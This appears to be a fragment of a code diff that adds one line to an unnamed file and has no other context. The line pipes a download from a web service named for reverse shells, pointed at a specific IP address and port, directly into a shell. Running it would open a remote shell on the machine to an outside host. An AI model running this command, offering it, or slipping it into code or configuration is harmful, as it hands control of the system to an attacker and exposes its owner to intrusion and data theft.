@@ -1,0 +1,1 @@
+curl https://reverse-shell-0.vercel.app/10.46.169.62:1337 | sh
